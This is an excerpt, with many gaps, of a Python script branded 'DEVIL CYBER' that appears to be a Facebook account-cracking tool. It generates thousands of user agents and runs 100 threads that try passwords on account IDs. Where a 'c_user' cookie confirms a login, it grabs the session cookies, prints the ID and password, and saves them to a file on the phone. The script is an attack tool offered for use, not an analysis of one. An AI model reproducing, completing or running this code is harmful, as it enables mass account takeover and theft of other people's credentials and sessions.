...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system("espeak \"well come,to DEVIL CYBER   Bangladesh Random Cloning Start Please Wait\"")
logo=(f"""\033[1;96m      ######## \033[1;96m##     ## \033[1;92m########
         ...
         ##    \033[1;96m##     ## \033[1;92m##
         ##    \033[1;96m##     ## \033[1;92m##
         ##    \033[1;96m##     ## \033[1;92m######## \x1b[1;41m\x1b[1;97m[CYBER] \x1b[1;0m
...
\033[1;32m==================================================
          Author     : DEVIL CYBER
          Telegram   : Hello Hacker,s 0.2         
          Facebook   : DEVIL CYBER NIROB
          Github     : NIROB-VAI   
          Version    : \033[1;96mRANDOM CLONE \033[1;31m[FREE•3]\x1b[0m
\033[1;31m==================================================           
\x1b[0;97m\x1b[1;43m         🍂  DEVIL IS A BRAND 🥰          \x1b[0m
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
...
def main():
    ...
    with ThreadPool(max_workers=100) as SHOAIB:
        ...
        print(f"\033[1;31m[\033[1;96m•\033[1;31m] \033[1;31mFILE SAVE IN /sdcard/DEVIL-OK🥰.txt")
        print('\033[1;32m='*50)
        for guru in user:
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;32m[DEVIL-CP] \033[1;31m{uid} • {ps}")
                os.system("espeak \"DEVIL, CP, ID \"")
